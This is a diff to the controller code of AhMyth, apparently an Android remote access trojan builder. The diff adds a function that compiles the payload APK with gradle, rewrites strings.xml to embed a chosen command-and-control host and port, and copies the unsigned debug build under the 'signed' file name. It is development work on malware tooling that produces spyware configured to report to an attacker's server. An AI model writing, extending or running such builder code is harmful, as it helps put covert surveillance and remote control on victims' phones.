@@ -122,6 +122,44 @@ app.controller("AppCtrl", ($scope) => {
 
 
 
+    // function to build ahmyth apk using gradle from source code
+    $appCtrl.BuildAhmythApk = () => {
+        $appCtrl.Log('Building APK with gradle...');
+        var ahmythFolder = CONSTANTS.ahmythApkFolderPath;
+        var buildScript = path.join(ahmythFolder, process.platform === 'win32' ? 'gradlew.bat' : 'gradlew');
+        
+        var buildApk = exec('"' + buildScript + '" assembleDebug', 
+            { cwd: ahmythFolder, maxBuffer: 1024 * 1024 * 10 },
+            (error, stdout, stderr) => {
+                if (error !== null) {
+                    $appCtrl.Log('APK Building Failed: ' + error.message, CONSTANTS.logStatus.FAIL);
+                    return;
+                }
+
+                var debugApkPath = path.join(ahmythFolder, 'app/build/outputs/apk/debug/app-debug.apk');
+                var outputApkPath = path.join(outputPath, CONSTANTS.apkName);
+                
+                $appCtrl.Log('Copying APK to output folder...');
+                fs.copy(debugApkPath, outputApkPath, (error) => {
+                    if (error) {
+                        $appCtrl.Log('Copying APK Failed', CONSTANTS.logStatus.FAIL);
+                        return;
+                    }
+
+                    fs.copy(outputApkPath, path.join(outputPath, CONSTANTS.signedApkName), (error) => {
+                        if (error) {
+                            $appCtrl.Log('Copying Signed APK Failed', CONSTANTS.logStatus.FAIL);
+                            return;
+                        }
+
+                        $appCtrl.Log('APK built successfully', CONSTANTS.logStatus.SUCCESS);
+                        $appCtrl.Log("The APK has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
+                        $appCtrl.$apply();
+                    });
+                });
+            });
+    };
+
     // function to build the apk and sign it
     $appCtrl.GenerateApk = (apkFolder) => {
 
@@ -302,14 +340,14 @@ app.controller("AppCtrl", ($scope) => {
         
         // Update strings.xml with new server host and port
         var stringsFile = path.join(CONSTANTS.ahmythApkFolderPath, 'app/src/main/res/values/strings.xml');
-        $appCtrl.Log('Reading strings.xml file from ' + CONSTANTS.apkName + '...');
+        $appCtrl.Log('Updating strings.xml with new server configuration...');
         fs.readFile(stringsFile, 'utf8', (error, data) => {
             if (error) {
                 $appCtrl.Log('Reading strings.xml Failed', CONSTANTS.logStatus.FAIL);
                 return;
             }
 
-            $appCtrl.Log('Updating server host and port in strings.xml...');
+            $appCtrl.Log('Replacing server host and port...');
             
             // Replace server_ip
             var result = data.replace(/<string name="server_ip">.*?<\/string>/g, '<string name="server_ip">' + host + '</string>');
@@ -324,7 +362,7 @@ app.controller("AppCtrl", ($scope) => {
 
                 // check if bind apk is enabled
                 if (!$appCtrl.bindApk.enable) {
-                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
+                    $appCtrl.BuildAhmythApk();
 
                 } else {
                     // generate a solid ahmyth apk
